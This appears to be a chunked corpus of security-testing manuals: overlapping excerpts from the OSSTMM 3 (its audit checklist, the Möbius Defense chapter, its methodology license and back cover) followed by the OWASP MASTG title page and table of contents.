1. POSTURE REVIEW TASK COMMENTS COMPLETION STATUS 1.1 Identified business objectives and markets. 1.2 Identified legislation and regulations applicable to the targets in the scope. 1.3 Identified business policies. 1.4 Identified business and industry ethics policies. 1.5 Identified operation cultures and norms. 1.6 Identified operation times and flows applicable to the targets in the scope. 1.7 Identified all necessary Channels for this scope. 1.8 Identified all Vectors for this scope. 2. LOGISTICS TASK COMMENTS COMPLETION STATUS 2.1 Applied testing safety measures. 2.2 Determined and accounted for test instabilities. 2.3 Determined and accounted for downtime in scope. 2.4 Determined and accounted for test pace according to the test environment and the security presence. 3. ACTIVE DETECTION VERIFICATION TASK COMMENTS COMPLETION STATUS 3.1 Determined and accounted for interferences. 3.2 Tested with both interferences active and inactive. 3.3 Determined restrictions imposed on tests. 3.4 Verified detection rules and predictability. 4. VISIBILITY AUDIT TASK COMMENTS COMPLETION STATUS 4.1 Determined targets through all enumeration tasks. 4.2 Determined new targets by researching known targets.\\nPage 3 of 9 5. ACCESS VERIFICATION TASK COMMENTS COMPLETION STATUS 5.1 Verified interactions with access points to all targets in the scope. 5.2 Determined type of interaction for all access points. 5.3 Determined source of interaction defined as a service or process. 5.4 Verified depth of access.",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 132
    }
  },
  {
    "text": "researching known targets.\\nPage 3 of 9 5. ACCESS VERIFICATION TASK COMMENTS COMPLETION STATUS 5.1 Verified interactions with access points to all targets in the scope. 5.2 Determined type of interaction for all access points. 5.3 Determined source of interaction defined as a service or process. 5.4 Verified depth of access. 5.5 Verified known security limitations of discovered access points. 5.6 Searched for novel circumvention techniques and security limitations of discovered access points. 6. TRUST VERIFICATION TASK COMMENTS COMPLETION STATUS 6.1 Determined interactions that rely on other interactions to complete the test interaction according to the tasks. 6.2 Determined targets with trust relationships to other targets in the scope to complete interactions. 6.3 Determined targets with trust relationships to other targets outside the scope to complete interactions. 6.4 Verified known security limitations of discovered trusts between the trusts. 6.5 Verified known security limitations of discovered trusts between targets in the scope and the trusted interactions. 6.6 Searched for novel circumvention techniques and security limitations of discovered trusts.\\nPage 4 of 9 7. CONTROLS VERIFICATION TASK COMMENTS COMPLETION STATUS 7.1 Verified controls for Non-Repudiation functioning according to all tasks. 7.2 Verified controls for Confidentiality functioning according to all tasks. 7.3 Verified controls for Privacy functioning according to all tasks. 7.4 Verified controls for Integrity functioning according to all tasks. 7.5 Verified controls for Alarm functioning according to all tasks. 7.6 Verified known security limitations of all controls Class B categories. 7.7 Searched for novel circumvention techniques and security limitations of all controls Class B categories. 8. PROCESS VERIFICATION TASK COMMENTS COMPLETION STATUS 8.1 Determined all processes controlling the action of interactivity with each access. 8.2 Verified the interaction operates within the confines of the determined process. 8.3 Verified the interaction operates within the confines of the security policy for such interactions. 8.4 Determined the gap between the operations of interactions and the requirements of posture from the Posture Review. 8.5 Verified known security limitations of discovered processes. 8.6 Searched for novel circumvention techniques and security limitations of discovered processes.\\nPage 5 of 9 9. CONFIGURATION AND TRAINING VERIFICATION TASK COMMENTS COMPLETION STATUS 9.1 Verified configuration/training requirements according to the posture in the Posture Review. 9.2 Verified the application of appropriate security mechanisms as defined in the Posture Review. 9.3 Verified the functionality and security limitations within the configurations/training for the targets in the scope. 9.4 Searched for novel circumvention techniques and security limitations within configurations/training. 10. PROPERTY VALIDATION TASK COMMENTS COMPLETION STATUS 10.1 Determined the amount and type of unlicensed intellectual property distributed within the scope. 10.2 Verified the amount and type of unlicensed intellectual property available for sale/trade with the seller originating within the scope.\\nPage 6 of 9 11. SEGREGATION REVIEW TASK COMMENTS COMPLETION STATUS 11.1 Determined the amount and location of private information as defined in the Posture Review available through the targets. 11.2 Determined the type of private information as defined in the Posture Review available within the scope. 11.3 Verified the relationship between publicly accessible information outside the target detailing",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 133
    }
  },
  {
    "text": "COMPLETION STATUS 11.1 Determined the amount and location of private information as defined in the Posture Review available through the targets. 11.2 Determined the type of private information as defined in the Posture Review available within the scope. 11.3 Verified the relationship between publicly accessible information outside the target detailing private or confidential information defined in the Posture Review and the scope. 11.4 Verified the accessibility of public accesses within the target to people with disabilities. 12. EXPOSURE VERIFICATION TASK COMMENTS COMPLETION STATUS 12.1 Searched for available targets through publicly available sources outside of the scope. 12.2 Searched for available organizational assets as defined in the Posture Review through publicly available sources outside of the scope. 12.3 Determined access, visibility, trust, and controls information available publicly within the targets. 12.4 Determined a profile of the organization’s channel infrastructure for all channels tested through publicly available information within the targets. 12.5 Determined a profile of the organization’s channel infrastructure for all channels tested through publicly available information outside the scope.\\nPage 7 of 9 13. COMPETITIVE INTELLIGENCE SCOUTING TASK COMMENTS COMPLETION STATUS 13.1 Determined the business environment of partners, suppliers, workers, and market through publicly available information on targets within the scope. 13.2 Determined the business environment of partners, vendors, distributors, suppliers, workers, and market through publicly available information outside the scope. 13.3 Determined the organizational environment through publicly available information on targets within the scope. 13.4 Determined the organizational environment through publicly available information outside the scope. 14. QUARANTINE VERIFICATION TASK COMMENTS COMPLETION STATUS 14.1 Verified quarantine methods for interactions to the targets in the scope. 14.2 Verified quarantine methods for interactions from the targets to other targets outside the scope. 14.3 Verified length of time of quarantine. 14.4 Verified quarantine process from receive to release. 14.5 Verified known security limitations of discovered quarantines. 14.6 Searched for novel circumvention techniques and security limitations of discovered quarantines.\\nPage 8 of 9 15. PRIVILEGES AUDIT TASK COMMENTS COMPLETION STATUS 15.1 Verified the means of legitimately obtaining privileges for all authenticated interactions. 15.2 Verified the use of fraudulent identification to obtain privileges. 15.3 Verified the means of circumventing authentication requirements. 15.4 Verified the means of taking non-public authentication privileges. 15.5 Verified the means hijacking other authentication privileges. 15.6 Verified known security limitations of discovered authentication mechanisms to escalate privileges. 15.7 Searched for novel circumvention techniques and security limitations of discovered authentication mechanisms to escalate privileges. 15.8 Determined depth of all discovered authentication privileges. 15.9 Determined re-usability of all discovered authentication privileges on the authentication mechanisms on all targets. 15.10 Verified requirements towards obtaining authentication privileges for discriminatory practices according to the Posture Review. 15.11 Verified means towards obtaining authentication privileges for discriminatory practices for people with disabilities.\\nPage 9 of 9 16. SURVIVABILITY VALIDATION AND SERVICE CONTINUITY TASK COMMENTS COMPLETION STATUS 16.1 Determined measures applicable to disrupt or stop service continuity to and from the targets. 16.2 Verified continuity processes and safety mechanisms active for the targets. 16.3 Verified known security limitations of discovered safety and",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 134
    }
  },
  {
    "text": "with disabilities.\\nPage 9 of 9 16. SURVIVABILITY VALIDATION AND SERVICE CONTINUITY TASK COMMENTS COMPLETION STATUS 16.1 Determined measures applicable to disrupt or stop service continuity to and from the targets. 16.2 Verified continuity processes and safety mechanisms active for the targets. 16.3 Verified known security limitations of discovered safety and service continuity processes and mechanisms. 16.4 Searched for novel circumvention techniques and security limitations of discovered safety and service continuity processes and mechanisms. 17. END SURVEY, ALERT AND LOG REVIEW TASK COMMENTS COMPLETION STATUS 17.1 Verified methods for recording and alerting interactions to the targets in the scope. 17.2 Verified methods for recording and alerting interactions from the targets to other targets outside the scope. 17.3 Verified speed of recording and alerting. 17.4 Verified persistence of recording and alerting. 17.5 Verified integrity of recording and alerting. 17.6 Verified distribution process of recording and alerting. 17.7 Verified known security limitations of discovered recording and alerting methods. 17.8 Searched for novel circumvention techniques and security limitations of discovered recording and alerting methods.\\nThe more you move away from the prison concept of security, the more you require the cooperation and good intentions from the people you are securing. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 203\\nChapter 14 – What You Get What we will get from utilizing OSSTMM is really just about having a deep understanding of the interconnectedness of things. The people, processes, systems, and software all have some type of relationship. This interconnectedness requires interactions. Some interactions are passive and some are not. Some interactions are symbiotic while others are parasitic. Some interactions are controlled by one side of the relationship while others are controlled by both. Then some controls are flawed or superfluous, which is harmful to at least one side of the relationship, if not both. Other controls balance perfectly with the interactions. Whatever becomes of the interconnectedness, however the interactions occur, however they are controlled, they are the operations that make survival possible. When we test operations we get the big picture of our relationships. We get to see the interconnectedness of the operations in fine detail. We get to map out how we, our businesses, and our operations will survive and even thrive. Unfortunately, how we interact is just based on a collection of biases we accumulate during life, which are subjected to the emotional or bio-chemical state we are under when we have them. These are our shortcuts. Due to the incredible number of decisions we must make through-out all of our interactions we use a mental cheat-sheet to compare similar interactions rather than calculate each situation independently. We are, after all, only human. Most often though our opinions are limited and restricted to a small scope we know as “our little world”. We apply them everywhere because they make life easier. But when we take them with us and try to adhere them to larger, different, more complicated series and types of interactions, we will likely make mistakes. What may make perfect sense to",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 135
    }
  },
  {
    "text": "small scope we know as “our little world”. We apply them everywhere because they make life easier. But when we take them with us and try to adhere them to larger, different, more complicated series and types of interactions, we will likely make mistakes. What may make perfect sense to us based on our experiences may not make any sense at all outside of “our little world”. So what we need is a better, less biased way of looking at the bigger, more dynamic, less personal, world beyond ourselves. Furthermore, our little world is something we take around with us. When we are outside, our little world is outside with us. We interact in the space on the assumptions and prejudices we know and carry. When we go inside, we take our little world inside with us. This means we bring our ways of doing things and new interactions into a new environment. And it has always been this way. There is no perimeter. There is no us and them. It is each individual interacting and interconnecting with everyone and everything; each individual with their own little world of issues and preconceptions impacting on the rest, while at the same time being impacted by others. This means we need a way to see more than just the bigger world; we also need a way to see into each individual’s own little worlds too. Often the difficulty in creating security is blamed on the sophistication and the persistence of the attacks. However that only serves to shift the blame, but not solve the problem. The real challenge is in protecting particular interactions in an interconnected world filled with uncontrollable elements. Taken at face value, the sheer number of interactions may be daunting. Protection solutions often address this challenge by broadly addressing particular types of interactions or by monitoring all interactions as they occur for malicious intent. Unfortunately, broad security programs and processes cannot address enough of the elements as to provide significant protection. This leads security in practice to be more of an art depending on the practitioner to apply their own little world to the challenge of security. This can only add more complexity and new problems. The means to finding global, persistent protection in perfect balance with operations is through the Möbius Defense. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 204\\nThe Möbius Defense Due to the multitude of means in which interactions occur to and from any organization, such as the various Channels and vectors, the perimeters to be defended appear to take the shape of a Möbius strip. A Möbius Strip is a shape with no inside or outside which means there is no “side” to defend from. Therefore, what is needed is a defense designed to protect an environment where in each individual can be interacting and interconnecting with everyone and everything. The Möbius Defense does this in three steps: 1. Improving verification and analysis: verify and analyze operations for interactions and controls and not just",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 136
    }
  },
  {
    "text": "from. Therefore, what is needed is a defense designed to protect an environment where in each individual can be interacting and interconnecting with everyone and everything. The Möbius Defense does this in three steps: 1. Improving verification and analysis: verify and analyze operations for interactions and controls and not just flaws. 2. Establishing defense in width: apply defensive tactics to balance the controls of all interactions with operations. 3. Implementing a trust strategy: compartmentalize how interactions are authorized or controlled. 1. Improving Verification and Analysis The practice of verifying operational security must include more than just finding flaws. There needs to be a better accounting for and understanding of errors that will make tests inaccurate. There needs to be an improvement in test accuracy through a better understanding of what to test and when to test it. Increasing the accuracy of test results will serve to both provide results that can be repeated and results which can be used to make consistent measurements. The security test must catalog and classify all points of interaction, determine which controls exist for those interactions, and verify the functionality of those controls. Flaws within the scope or the controls must be classified by how they affect operations and not the possible or potential risk they pose to operations. The security test must also track that which was not tested and which tests were not performed to assure repeatability and fair comparisons with past and future tests. Finally, the testing Analyst must be capable of properly understanding the results of the test and what they mean for operations. The means to do all of this are provided within this manual. 2. Establishing Defense in Width The main concept behind a Möbius Defense is to provide Defense in Width and a balanced variety of controls to each interactive point. A perfect balance is achieved with the flawless application of all ten types of operational controls for each interactive point. This differs from Defense in Depth by assuring different types of controls applied to all interactive points rather than just any controls at various points within a process. With new information from the security test, a defensive posture can be created by verifying that a balance of controls exists at all points of interaction. This changes the environment in which inter-connectivity occurs, and curtails the possible operational changes caused by chaotic elements either inside or outside. The balance of controls is important because each control can add to the attack surface of an operation. Assuring a balance also assures that different types of controls are used which provide protection in different ways. This increases the range of attack types and problems that the interactive point can be defended against. The ravs are to be used to measure the amount of balance attained and to assure balance is maintained as new operations are introduced to the scope. This manual covers all the information required to build Defense in Width. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 205\\n3.",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 137
    }
  },
  {
    "text": "defended against. The ravs are to be used to measure the amount of balance attained and to assure balance is maintained as new operations are introduced to the scope. This manual covers all the information required to build Defense in Width. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 205\\n3. Implementing a Trust Strategy To know which interactions require less balance than others from Defense in Width is a matter of knowing which interactions we should trust. For the operations we have less reason to trust, we should apply more of the ten controls to achieve perfect balance. Individuals we have less reason to trust we place in environments where all interactions are protected by more of the ten controls. Conversely, trustworthy individuals can be authorized to have more individual control over the interactions in their environment. Finally we should separate elements from the environment when no significant reason to trust or benefit to the operation can be found in those elements. Doing so will also keep Defense in Width within a reasonable scale of operations so that efficiency and expense do not outweigh the benefits of protection. The trust metrics provided within this manual assure that the reasons to trust are based on facts. As the reasons to trust approach 100% we are not only certain that the individual or the operation are incapable of malicious or accidental damage but that it has been proven. This is no risk assessment or guess based on what we know from our “own little world.” The difficulty in this process however may be in assigning trust metrics to people. Unlike the informal and almost capricious way trust is often assigned, this new manner may seem cold and heartless. But it isn’t because while you are investigating what reasons you have to trust someone you are also able to fully inform them of what they can do to give you more reason to trust them. The typical means of trusting or not trusting is not so specific, nor is it so kind. It is more of a social game of being likeable or not to the person providing the authorization. The trust metrics are more transparent and more neutral aside from how someone feels based on their “own little world.” The trust metrics can even be verified by others, such as a board or a department, who can maintain the trust calculations neutrally and re-assess regularly or whenever it’s necessary. Get What We Need The application of the Möbius Defense has many ramifications. First, it assures that the results of security tests are the facts. It assures that the tests have been thorough and based on the processes of operations and not the skills of the Analyst. This provides an organization with an incredible amount of intelligence over their own operations for comparisons with other organizations, or even just trending self assessments. It is the kind of information that decisions require, and that which foster significant operational improvements. Second, it changes the frequency",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 138
    }
  },
  {
    "text": "skills of the Analyst. This provides an organization with an incredible amount of intelligence over their own operations for comparisons with other organizations, or even just trending self assessments. It is the kind of information that decisions require, and that which foster significant operational improvements. Second, it changes the frequency of security tests required because, instead of defenses being based on reacting to attacks and vulnerabilities, they are part of change control instead. Therefore when new operations are initiated, the environment will be re-assessed for new or different points of interaction. The need to test for new flaws is no longer necessary nor is the need to test for compatibility of security updates after fixing those flaws. Security updates, if desired, will instead become part of the change control process and can be tested on schedule. This will drastically reduce the time spent putting out fires so that new focus can be put on improving operations and building better infrastructure. Third, it changes the often secretive and socially demanding way we use trust within organizations. It allows the performance and history of each individual to speak for itself. This adds accountability to each role and removes prejudices that can strangle an organization, either operationally or legally. Not to mention it is the most fair means of assuring each person has the responsibility over their own successes and failures. The changes required by the typical organization to achieve these benefits are actually small. The changes required by the security industry to meet the new needs of the implementers of the Möbius Defense will be huge. And change will bring new opportunities. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 206\\nThis methodology is free precisely because we prefer to be free as well. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 207\\nChapter 15 – Open Methodology License The OML 3 This license is provided under the Creative Commons 3.0 Attribution, 2010 by ISECOM. PREAMBLE This license is intended to protect a methodology as a complex set of methods, processes, or procedures to be applied within a discipline. The key requirements of this license are that: 1) the methodology has value as intellectual property which through application thereof can produce value which is quantifiable, and 2) that the methodology is available publicly and an appropriate effort is made for the methodology to be transparent to anyone. With respect the GNU General Public License (GPL), this license is similar with the exception that it gives the right to developers to include this Open Methodology License (OML) to anything which is not modifiable and distributed commercially. The main concern covered by this license is that open methodology developers receive proper credit for contribution and development. Special considerations to the Free Software Foundation and the GNU General Public License for legal concepts and wording. TERMS AND CONDITIONS 1. The license applies to any methodology or other intellectual tool (i.e. matrix, checklist, etc.) which contains a notice placed by the creator saying it is protected under the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 139
    }
  },
  {
    "text": "Special considerations to the Free Software Foundation and the GNU General Public License for legal concepts and wording. TERMS AND CONDITIONS 1. The license applies to any methodology or other intellectual tool (i.e. matrix, checklist, etc.) which contains a notice placed by the creator saying it is protected under the terms of this Open Methodology License 3.0 or OML 3.0. 2. The Methodology refers to any such methodology, intellectual tool or any such work based on the Methodology. A “work based on the Methodology” means either the Methodology or any derivative work by Trade Secret law which applies to a work containing the Methodology or a portion of it, either verbatim or with modifications or translated into another language. 3. All persons may use, distribute, teach, and promote the Methodology exactly as it has been received, in any medium, provided that they conspicuously and appropriately publish on each copy the appropriate Open Methodology License notice and the attribution for the creator or creators of the Methodology; keep intact all the notices that refer to this License and to the absence of any warranty; give any other recipients of the Methodology a copy of this License along with the Methodology, and the location as to where they can receive an original copy of the Methodology from the Methodology creator. 4. Any persons who sell training or services of the Methodology must clearly display the name of the creators of this Methodology in addition to the terms of this license. 5. All persons may include this Methodology in part or in whole in commercial service offerings, private, internal, or non-commercial use including software, checklists, or tools, or within a class or training for educational purposes without explicit consent from the creator providing points 3 and 4 are complied with. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 208\\n6. No persons may distribute an adaption, modification, or change of this Methodology nor commercially sell a product, tool, checklist, or software which applies this Methodology without explicit consent from the creator. 7. All persons may utilize the Methodology or any portion of it to create or enhance free software and copy and distribute such software under any terms, provided that they also meet all of these conditions: a) Points 3, 4, 5, and 6 of this License are strictly adhered to. b) Any reduction to or incomplete usage of the Methodology in software must strictly and explicitly state which parts of the Methodology were utilized in the software and which parts were not. c) When the software is run, all software using the Methodology must either cause the software, when started running, to print or display an announcement of use of the Methodology including a notice of warranty how to view a copy of this License or make clear provisions in another form such as in documentation or delivered open source code. 8. If, as a consequence of a court judgment or allegation of Patent infringement, Trade Secret law infringement, or for any other",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 140
    }
  },
  {
    "text": "a notice of warranty how to view a copy of this License or make clear provisions in another form such as in documentation or delivered open source code. 8. If, as a consequence of a court judgment or allegation of Patent infringement, Trade Secret law infringement, or for any other legal reason, where conditions are imposed on any person (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse said person from the conditions of this License. If said person cannot satisfy simultaneously the obligations under this License and any other pertinent obligations, then as a consequence said person may not use, copy, apply, use, distribute, or promote, the Methodology at all. If any portion of this section is held invalid or unenforceable under any particular circumstance, the balance of the section is intended to apply and the section as a whole is intended to apply in other circumstances. 9. If the distribution or use of the Methodology is restricted in certain countries either by patents or by Trade Secret interfaces, the original creator who places the Methodology under this License may add an explicit geographical distribution limitation excluding those countries, so that application, use, or distribution is permitted only in or among countries not thus excluded. In such case, this License incorporates the limitation as if written in the body of this License. 10. ISECOM may publish revised or new versions of the Open Methodology License. Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns. NO WARRANTY 11. Because the methodology is licensed free of charge, there is no warranty for the methodology, to the extent permitted by applicable law except when otherwise stated in writing the creator or other parties provide the methodology “as is” without a warranty of any kind, either expressed or implied, including, but not limited to, the implied warranties of merchantability and fitness for a particular purpose. The entire risk as to the quality and performance in use of the methodology is with the persons accepting this license. Should the methodology prove incomplete or incompatible said person assumes the cost of all necessary servicing, repair or correction. 12. In no event unless required by applicable law or agreed to in writing will the creator, or any other party who may use, apply, or teach the methodology unmodified as permitted herein, be liable to any persons for damages, including any general, special, incidental or consequential damages arising out of the use of or inability to use the methodology (including but not limited to loss, inaccuracies, or failure of the methodology to operate with any other methodologies), even if such holder or other party has been advised of the possibility of such damages. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 209\\n\\nWhy test operations? Unfortunately, not everything works as configured. Not everyone behaves as trained. Therefore the truth of configuration and training is in",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 141
    }
  },
  {
    "text": "any other methodologies), even if such holder or other party has been advised of the possibility of such damages. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 209\\n\\nWhy test operations? Unfortunately, not everything works as configured. Not everyone behaves as trained. Therefore the truth of configuration and training is in the resulting operations. That’s why we need to test operations. The Open Source Security Testing Methodology Manual strives to be the ultimate security guide. Better known to security experts and hackers alike as the OSSTMM, spoken like “awesome” but with a “t”, is a formal methodology for breaking any security and attacking anything the most thorough way possible. Released for free for the first time in 2001 as the underdog to the security industry’s product- focused security advice, the manual achieved an instant following. Being open to anyone for peer review and further research led to it growing from its initial 12 page release to its current size of over 200 pages. For testing security operations and devising tactics it has no equal. The OSSTMM is in its third version and is a complete re-write of the original methodology. It now includes the ever-elusive security and trust metrics at its foundation. It required 7 years of research and development to produce the perfect operational security metric, an algorithm which computes the Attack Surface of anything. In essence, it is a numerical scale to show how unprotected and exposed something currently is. Security professionals, military tacticians, and security researchers know that without knowing how exposed a target is, it’s just not possible to say how likely a threat will cause damage and how much. But to know this requires a thorough security test which happens to be exactly what the OSSTMM provides. To say the OSSTMM 3 is a very thorough methodology is an understatement. It covers proper attack procedures, error handling, rules of engagement, proper analysis, critical security thinking, and trust metrics. It provides 17 modules like Visibility Audit, Trust Verification, Property Validation, and Competitive Intelligence Scouting, each which describes multiple attacks (called Tasks), for 5 different interaction types with a target (called Channels) organized by technical knowledge and equipment requirements as Human, Physical, Telecommunications, Data Networks, and Wireless. The OSSTMM has indeed become a complex organism but with a new focus on readability and usability, it is far from complicated to use. Security doesn’t have to last forever; just longer than everything else that might notice it’s gone. Official OSSTMM Certifications: www.opsa.org, www.opst.org, www.opse.org, www.owse.org, www.trustanalyst.org Copyright 2010, ISECOM, www.isecom.org, www.osstmm.org",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 142
    }
  },
  {
    "text": "MASTG Mobile Application Security Testing Guide Version v1.7.0 Sven Schleier Carlos Holguera\\nOWASP Mobile Application Security Testing Guide (MASTG) v1.7.0 released October 30, 2023 Release Notes: https://github.com/OWASP/owasp-mastg/releases/tag/v1.7.0 Online version available at https://github.com/OWASP/owasp-mastg/releases/t ag/v1.7.0 The OWASP MASTG, available online at https://mas.owasp.org/MASTG, is part of the OWASP Mobile Application Security (MAS) Project and is based on the OWASP Mobile Application Security Verification Standard (MASVS) v2.0.0 https://mas.owasp.org Copyright © The OWASP Foundation\\nThisworkislicensedunderCreativeCommonsAttribution-ShareAlike4.0International. Foranyreuseordistribution,you mustmakecleartoothersthelicensetermsofthiswork. OWASP®isaregisteredtrademarkoftheOWASPFoundation, Inc. ISBN:978-1-257-96636-3 CoverdesignbyCarlosHolguera 3\\nContents Foreword 12 Frontispiece 14 AbouttheOWASPMASTG . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 Authors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 Co-Authors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15 Changelog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 Disclaimer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 CopyrightandLicense . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 OWASPMASVSandMASTGAdoption 17 MobilePlatformProviders . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 CertificationInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 StandardizationInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18 GovernmentalInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 EducationalInstitutions . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 0
    }
  },
  {
    "text": ". . . . . . 18 GovernmentalInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 EducationalInstitutions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 ApplicationinScientificResearch . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 Books . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 IndustryCaseStudies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20 Acknowledgments 21 Contributors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21 (cid:0)MASAdvocates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21 OurMASAdvocates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22 IntroductiontotheOWASPMobileApplicationSecurityProject 25 KeyAreasinMobileApplicationSecurity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25 NavigatingtheOWASPMASTG . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27 MobileApplicationTaxonomy 28 NativeApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28 WebApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28 HybridApp .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 1
    }
  },
  {
    "text": ". 28 WebApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28 HybridApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29 ProgressiveWebApp . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29 What’sCoveredintheMobileTestingGuide . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29 MobileApplicationSecurityTesting 30 PrinciplesofTesting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30 SecurityTestingandtheSDLC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35 References . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41 MobileAppTamperingandReverseEngineering 42 WhyYouNeedIt . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42 BasicTamperingTechniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43 StaticandDynamicBinaryAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43 AdvancedTechniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47 References . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49 MobileAppAuthenticationArchitectures 50 GeneralAssumptions . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 2
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49 MobileAppAuthenticationArchitectures 50 GeneralAssumptions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50 GeneralGuidelinesonTestingAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51 Statefulvs.StatelessAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51 OAuth2.0 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53 UserLogout . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55 SupplementaryAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 Two-factorAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 LoginActivityandDeviceBlocking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58 4\\nMobileAppNetworkCommunication 59 SecureConnections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59 ServerTrustEvaluation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59 VerifyingtheTLSSettings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61 InterceptingHTTP(S)Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 3
    }
  },
  {
